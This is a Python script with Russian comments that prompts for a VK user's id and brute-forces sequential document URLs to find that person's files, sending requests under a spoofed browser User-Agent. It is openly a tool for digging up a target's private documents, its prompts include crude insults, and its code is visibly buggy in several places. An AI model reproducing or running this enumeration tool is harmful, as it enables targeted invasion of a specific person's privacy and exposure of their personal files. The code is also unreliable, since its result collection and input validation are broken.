
import os
import sys
import time
import subprocess

try:
    """Установка библиотеки requests при ее отсутствии"""
    import requests
except Exception:
    os.system("pip install requests")
    os.system("pip3 install requests")
    import requests
else:
    pass


def test(start):
    """Функция для проверки стартового значения на отсутствие иных знаков кроме цифр от 0 до 9"""
    for x in start:
        if int(x) not in range(0, 10):
            print("Ты ебан, без букав, ТОКА ЦЫФОРЫ")
            return False
    return True

headers = {
    "User-Agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.97 Safari/537.36 Vivaldi/1.94.1008.44"
}
# Инфа что должно быть установлено чтобы работал скрипт
#print("У вас должны быть установлены python3, requests(pip или pip3 install requests)\n")
# id по которому будет идти парсинг-брут
id = input("пиши id у кого хочешь найти сок. id всмысле цифры, если нету этот сайт поможет найти http://vkuid.com\n")
URL = "https://vk.com/doc" + id + "_"
start = ""

# Цикл для ввода стартового значения(откуда начать брутить)
while (len(start) not in range(1, 10) and test(start)):
    start = input(
        "откуда начать? можно написать максимум 9 цифр. от 0 до 999999999\n")


def cls():
    """Clear terminal (command line)"""
    os.system('cls' if os.name == 'nt' else 'clear')


def parse():
    """Функция парсинга доков с проверкой на существование дока"""
    cls()
    parsedFiles = list()
    per = 0
    all = 10**9
    for n in range(int(start), 10**9):
        docNum = str(n)
        newUrl = URL + docNum
        # проверка на существование
        if requests.get(newUrl, headers=headers).text.find("Этот документ был удалён из общего доступа.") != -1:
            parsedFiles += list(newUrl)
            print(newUrl)
        per = round((int(docNum) / all), 2)
        sys.stdout.write(  # Вывод строки статистики
            "id:{5} counter:{0}/{1} progress:{2}% doc_number:{3} find_docs:{4}   \r".format(int(docNum), all, per, docNum, len(parsedFiles), id))
        sys.stdout.flush()

parse()
print(parsedFiles)